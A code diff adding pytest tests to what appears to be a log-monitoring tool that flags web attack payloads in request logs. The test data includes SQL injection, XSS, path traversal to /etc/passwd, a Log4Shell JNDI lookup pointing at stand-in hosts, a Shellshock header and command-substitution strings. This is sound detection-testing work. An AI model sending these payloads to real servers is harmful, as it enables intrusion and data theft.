@@ -326,3 +326,78 @@ def test_thirty_different_missing_paths_make_a_walk(site, distinct, expected):
     send(store, source, walk(70, paths=paths))
     run(store)
     assert len(problems(store)) == expected
+
+
+def attacks(count, *, target="/", agent="Mozilla/5.0", status=400, ip="203.0.113.9", start=None):
+    base = time.time() - 600 if start is None else start
+    return [line(ip=ip, status=status, target=target, agent=agent, when=base + n) for n in range(count)]
+
+
+@pytest.mark.parametrize(
+    "target, kind",
+    [
+        ("/item?id=1%20UNION%20SELECT%201,2,3", "SQL injection (6)"),
+        ("/item?id=1'+or+'1'='1", "SQL injection (6)"),
+        ("/q?x=sleep(5)", "SQL injection (6)"),
+        ("/s?q=%3Cscript%3Ealert(1)%3C/script%3E", "XSS (6)"),
+        ("/download?f=../../../../etc/passwd", "path traversal (6)"),
+        ("/..%2f..%2f..%2fetc%2fpasswd", "path traversal (6)"),
+        ("/f?n=%252e%252e%252f%252e%252e%252f%252e%252e%252fwin.ini", "path traversal (6)"),
+        ("/?x=${jndi:ldap://x.example/a}", "JNDI (Log4Shell) (6)"),
+        ("/x?c=$(whoami)", "command execution (6)"),
+        ("/index.php?page=php://input", "command execution (6)"),
+    ],
+)
+def test_requests_carrying_attack_fragments_are_a_quiet_low_finding(site, target, kind):
+    store, source = site
+    send(store, source, attacks(6, target=target))
+    run(store)
+    (found,) = problems(store)
+    assert found["severity"] == "LOW" and found["data"]["reasoning"] == "web_attack_payloads"
+    assert f"Kinds: {kind}." in found["data"]["summary"]
+    assert "6 requests from 1 clients" in found["data"]["summary"]
+
+
+@pytest.mark.parametrize(
+    "agent",
+    ["${jndi:ldap://198.51.100.5/a}", "() { :; }; /bin/bash -c 'id'"],
+)
+def test_headers_are_checked_too(site, agent):
+    store, source = site
+    send(store, source, attacks(5, agent=agent))
+    run(store)
+    assert [p["data"]["reasoning"] for p in problems(store)] == ["web_attack_payloads"]
+
+
+def test_the_digest_counts_each_kind_and_hides_the_query(site):
+    store, source = site
+    send(store, source, attacks(3, target="/item?id=1+UNION+SELECT+password+FROM+users") + attacks(3, target="/f?n=../../../../etc/passwd", start=time.time() - 590))
+    run(store)
+    summary = problems(store)[0]["data"]["summary"]
+    assert "SQL injection (3), path traversal (3)" in summary
+    assert "password" not in summary and "etc/passwd" not in summary
+
+
+def test_ordinary_requests_that_use_the_same_words_are_not_attacks(site):
+    store, source = site
+    harmless = ["/search?q=how+to+select+a+union", "/products?category=or&sort=1", "/blog/system-design", "/api/v1/id", "/docs/eval", "/page?x=a%7Cb"]
+    send(store, source, [line(target=harmless[n % len(harmless)], when=time.time() - 300 + n) for n in range(120)])
+    run(store)
+    assert not problems(store)
+
+
+def test_four_attack_requests_are_not_yet_a_finding(site):
+    store, source = site
+    send(store, source, attacks(4, target="/item?id=1%20UNION%20SELECT%201"))
+    run(store)
+    assert not problems(store)
+
+
+def test_hostile_strings_are_matched_quickly():
+    from logsentinel.portal.web_signals import attack_kinds
+
+    hostile = ["${" * 700, "../" * 700, "'" + " or " * 400, "union " * 300, "|" * 1000 + "x", "<svg" + " " * 900, "+" * 2000 + "union", ";" * 1000]
+    started = time.perf_counter()
+    for text in hostile:
+        attack_kinds("/" + text, "ua", "-")
+    assert time.perf_counter() - started < 0.5
